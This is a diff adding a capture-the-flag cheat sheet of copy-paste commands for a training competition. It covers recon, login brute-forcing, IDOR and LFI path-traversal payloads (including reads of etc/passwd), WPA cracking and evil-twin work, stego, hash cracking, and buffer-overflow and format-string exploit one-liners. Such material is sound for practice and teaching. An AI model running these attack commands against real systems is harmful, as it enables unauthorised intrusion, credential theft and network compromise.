@@ -1,0 +1,202 @@
+###########################################################################
+#  CTF commands - copy one line at a time. Replace IP, PORT, FILE, SSID...
+#  Lines starting with # are notes, don't paste those.
+#  Flags: ehCTF{...}  (bare 32-char string or a name? submit as ehCTF{value})
+###########################################################################
+
+# ======================= BEFORE YOU START =======================
+cd ~/Desktop/tools/recon
+chmod +x *.sh *.py
+sudo apt install -y nmap smbclient smbmap dnsutils snmp seclists tshark aircrack-ng steghide stegseek binwalk exiftool john fcrackzip gdb python3-pwntools
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+python3 -c 'from pwn import *; print("ok")'
+
+
+# ======================= RECON (box questions) =======================
+# start here, runs in the background (sudo -v first so it doesn't hang)
+sudo -v
+sudo nohup bash recon_hunt.sh -t IP -r 'ehCTF\{[^}]*\}' > /dev/null 2>&1 < /dev/null &
+tail -f recon_IP/run.log
+
+# same thing, in front of you
+sudo bash recon_hunt.sh -t IP -r 'ehCTF\{[^}]*\}'
+
+# question names ports / a range
+sudo bash recon_hunt.sh -t IP -p 15000-15100 -r 'ehCTF\{[^}]*\}'
+
+# rules say keep scanning light
+sudo bash recon_hunt.sh -t IP -T 100 -R 100 -W 5 -r 'ehCTF\{[^}]*\}'
+
+# quick first look
+sudo bash recon_hunt.sh -t IP -q -r 'ehCTF\{[^}]*\}'
+
+# domain known
+sudo bash recon_hunt.sh -t IP -d lab.local -r 'ehCTF\{[^}]*\}'
+
+# creds for a pop-up (basic auth) login
+sudo bash recon_hunt.sh -t IP -p 80 -A 'user:pass' -r 'ehCTF\{[^}]*\}'
+
+# nothing found on web, go deep (thousands of requests, use last)
+sudo bash recon_hunt.sh -t IP -p 80 -D -r 'ehCTF\{[^}]*\}'
+
+# after the run: summary + every ehCTF flag it saved
+tail -60 recon_IP/run.log
+grep -rhoaE 'ehCTF\{[^}]*\}' recon_IP/ | sort -u
+
+# add a vhost it found
+echo 'IP dev.lab.local' | sudo tee -a /etc/hosts
+
+# --- recon by hand ---
+sudo nmap -p- --min-rate 1000 -Pn -n IP
+sudo nmap -sV -sC -p PORTS IP
+sudo nmap -sV --version-all -p PORT IP
+sudo nmap -sU -p 53,161 IP
+nc -nv IP PORT
+ssh -p 2222 x@IP
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://IP -H 'Host: FUZZ.lab.local' -fs SIZE_OF_DEFAULT_PAGE
+ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://IP/login -X POST -H 'Host: login.lab.local' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=FUZZ&password=x' -mc all -fc 404
+ffuf -w /usr/share/wordlists/rockyou.txt -u http://IP/login -X POST -H 'Host: login.lab.local' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=Admin&password=FUZZ' -mc all -fc 401
+seq -f 'staff%03g' 0 99 > users.txt
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt IP http-get /staff/login.php
+ftp IP
+smbclient -L //IP -N
+smbclient -N //IP/public -c 'recurse ON; prompt OFF; mget *'
+dig axfr lab.local @IP
+dig TXT flag.lab.local @IP
+snmpwalk -v2c -c public IP
+
+
+# IDOR ("not given a link to", ?PID=3 / ?id=5 in the URL): recon's IDOR sweep does it, or by hand:
+python3 recon_web.py -u http://IP:PORT -o web_PORT
+grep -A16 'IDOR sweep' recon_IP/web_PORT.log
+for i in $(seq 0 50); do echo "== $i"; curl -s "http://IP:PORT/module.php?PID=$i"; done | less
+
+
+# ======================= LFI =======================
+python3 lfi_hunter.py -u 'http://HOST/reader.php?page=FUZZ' -t etc/passwd
+python3 lfi_hunter.py -u 'http://HOST/reader.php?page=FUZZ' -t secrets/notes.txt
+python3 lfi_hunter.py -u 'http://HOST/archive.php?page=FUZZ' -t secrets/audit.php --prefix content/languages/
+python3 lfi_hunter.py -u 'http://HOST/reader.php?page=FUZZ' -t secrets/notes.txt -H 'Cookie: PHPSESSID=VALUE'
+python3 lfi_hunter.py -u 'http://HOST/reader.php?page=FUZZ' -t secrets/notes.txt -v
+
+# --- by hand ---
+curl 'http://HOST/reader.php?page=../../secrets/notes.txt'
+curl 'http://HOST/translations.php?page=....//....//secrets/review.txt'
+curl 'http://HOST/archive.php?page=php://filter/convert.base64-encode/resource=FILE' | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d
+
+
+# ======================= WI-FI =======================
+# SSID = network NAME, e.g. Canteen-Guest (case-sensitive, goes after -e; quote if it has spaces: -e 'Free WiFi')
+# MAC/BSSID = hardware address, 6 hex pairs, e.g. 00:1b:54:7f:82:10 (goes after -b AP, -c client, -v victim; NEVER after -e)
+# -p = the real password from the question, not the word PASS. Open network: leave -p out.
+# Don't know the SSID? run survey first.
+bash wifi_ctf.sh survey -f FILE
+bash wifi_ctf.sh assoc -f FILE -c 00:21:6a:8e:3c:51
+bash wifi_ctf.sh crack -f FILE -w wordlist.txt -e SSID -r 'ehCTF\{[^}]*\}'
+bash wifi_ctf.sh crack -f FILE -e SSID -p 'PASS' -r 'ehCTF\{[^}]*\}'
+# KEK / KCK / PMK questions: crack mode prints them after cracking (also saved in crack_NAME/keys.txt). Standalone:
+python3 wpa_keys.py FILE 'PASSPHRASE' SSID
+bash wifi_ctf.sh twin -f FILE -e SSID -p 'PASS'
+bash wifi_ctf.sh twin -f FILE -e SSID -p 'PASS' -v 02:85:9a:4c:17:b6
+# example (practice range): bash wifi_ctf.sh twin -f evil-twin.pcap -e Canteen-Guest -p 'KopiO2026CanteenGuest'
+
+# --- by hand ---
+aircrack-ng -w wordlist.txt -e SSID FILE
+airdecap-ng -e SSID -p 'PASS' FILE
+tshark -r FILE-dec.pcap -Y http -T fields -e http.file_data | grep -oE 'ehCTF\{[^}]*\}|[A-Za-z0-9]{32}'
+# if that prints hex instead of text (newer tshark), decode it first:
+tshark -r FILE-dec.pcap -Y http -T fields -e http.file_data | xxd -r -p | grep -aoE 'ehCTF\{[^}]*\}|[A-Za-z0-9]{32}'
+
+
+# ======================= STEGO =======================
+bash stego_hunt.sh -f FILE -r 'ehCTF\{[^}]*\}'
+bash stego_hunt.sh -f FILE -p 'PASS' -r 'ehCTF\{[^}]*\}'
+bash stego_hunt.sh -f FILE -w /usr/share/wordlists/rockyou.txt -r 'ehCTF\{[^}]*\}'
+bash stego_hunt.sh -f FILE -q -r 'ehCTF\{[^}]*\}'
+bash stego_hunt.sh -d 'STRING'
+
+# --- by hand ---
+exiftool FILE
+strings -n 6 FILE | grep -iE 'ctf|flag|pass'
+binwalk -e FILE
+steghide extract -sf FILE -p 'PASS'
+stegseek FILE /usr/share/wordlists/rockyou.txt
+zsteg -a FILE
+
+
+# ======================= PASSWORD CRACKING =======================
+bash crack_hunt.sh FILE
+bash crack_hunt.sh hash.txt
+bash crack_hunt.sh 'PASTE_HASH_HERE'
+bash crack_hunt.sh FILE -w words.txt -r
+bash crack_hunt.sh FILE -r -M 20
+bash crack_hunt.sh shadow -P passwd
+bash crack_hunt.sh hash.txt -f nt
+
+# --- by hand ---
+zip2john flag.zip > h.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt h.txt
+john --show h.txt
+unzip -P 'PASS' flag.zip
+7z x -p'PASS' flag.zip
+hashcat -m 0 h.txt /usr/share/wordlists/rockyou.txt
+
+
+# ======================= PWN (by hand) =======================
+# 3 probes: normal / crash = overflow / hex back = format string
+nc IP PORT
+python3 -c 'print("A"*200)' | nc IP PORT
+python3 -c 'print("%p."*20)' | nc IP PORT
+
+# look at the binary
+file chall
+checksec --file=chall
+nm chall | grep -iE 'win|flag|backdoor|shell'
+cat chall.c
+
+# variable overwrite (buffer 32 + value from the source)
+python3 -c 'import sys; sys.stdout.buffer.write(b"A"*32 + (0x1337c0de).to_bytes(4,"little") + b"\n")' | nc IP PORT
+
+# ret2win 64-bit (offset = buffer + 8; crashes at win? use win+1)
+python3 -c 'import sys; sys.stdout.buffer.write(b"A"*40 + (0x401186).to_bytes(8,"little") + b"\n")' | nc IP PORT
+
+# ret2win 32-bit (4-byte address)
+python3 -c 'import sys; sys.stdout.buffer.write(b"A"*32 + (0x80491d6).to_bytes(4,"little") + b"\n")' | nc IP PORT
+
+# strcmp "simple buffer"
+python3 -c 'print("A"*16 + "impossible?")' | nc IP PORT
+
+# keep the shell open after the payload
+(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*40 + (0x401186).to_bytes(8,"little") + b"\n")'; cat) | nc IP PORT
+
+# format string: one position per connection, then decode leak.txt (python snippet in pwn_cheatsheet)
+for i in $(seq 1 60); do printf '%%%d$p\n' $i | nc -q1 IP PORT; done > leak.txt
+python3 -c 'print("%7$s")' | nc IP PORT
+
+# offset with a cyclic pattern (binary on your machine)
+cyclic 200 > pat.txt
+gdb -q ./chall
+# in gdb:  run < pat.txt   then   info registers eip   then quit, and:
+cyclic -l 0x6161616c
+
+
+# ======================= KALI =======================
+sudo rm -rf recon_127.0.0.1
+cp -f ~/Downloads/recon_hunt.sh ~/Downloads/recon_web.py ~/Desktop/tools/recon/
+sudo chown -R $USER:$USER ~/Desktop/tools
+find ~ -iname '*recon*' 2>/dev/null
+grep -rniE 'ehCTF|flag|pass' FOLDER
+unzip -o FILE.zip -d OUTDIR
+file FILE
+jobs
+ps aux | grep recon_hunt
+sudo pkill -f recon_hunt
+sudo ss -tlnp
+nc -zv IP PORT
+curl -i http://IP/
+ip -br a
+python3 -m http.server 8080
+echo 'STRING' | base64 -d
+echo 'HEX' | xxd -r -p
+echo 'STRING' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+history | grep nmap
